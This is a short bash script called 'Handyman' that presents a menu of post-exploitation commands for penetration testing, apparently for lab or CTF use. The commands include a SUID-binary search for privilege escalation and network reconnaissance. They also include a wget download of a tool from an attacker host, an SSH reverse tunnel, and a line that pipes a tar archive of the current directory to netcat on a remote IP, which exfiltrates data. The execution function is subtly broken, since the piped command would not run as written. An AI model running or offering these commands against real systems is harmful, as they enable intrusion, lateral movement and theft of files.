#! /bin/bash

COMMAND_1='find / -perm -u=s -type f 2>/dev/null'
COMMAND_2='arp -a'
COMMAND_3='ss -tulpn'
COMMAND_4='scp FILE_TO_SEND L_H_O_S_T'
COMMAND_5='wget -O /tmp/ http://10.9.233.39:8000/[TOOL]'
COMMAND_6='ssh -R 8000:172.16.0.1:80 frog@172.16.0.2 -i id_rsa -fN'
COMMAND_7='tar cf - . | nc 10.9.233.39 5555'

show_menus() {
  clear
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "                                Handyman                                      "
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "  1) $COMMAND_1"
  echo "  2) $COMMAND_2"
  echo "  3) $COMMAND_3"
  echo "  4) $COMMAND_4"
  echo "  5) $COMMAND_5"
  echo "  6) $COMMAND_6"
  echo "  7) $COMMAND_7"
  echo ""
  echo "  x. Exit"
  echo ""
}

run() {
  $1 
  exit 0
}

read_options() {
  local choice
  read -p "Enter choice " choice
  case $choice in
    1) run $COMMAND_1;;
    2) run $COMMAND_2;;
    3) run $COMMAND_3;;
    4) run $COMMAND_4;;
    5) run $COMMAND_5;;
    6) run $COMMAND_6;;
    7) run $COMMAND_7;;

    x) exit 0;;
    exit) exit 0;;
  esac
}

do_menu() {
  while true
  do
    show_menus
    read_options
  done
}

do_menu
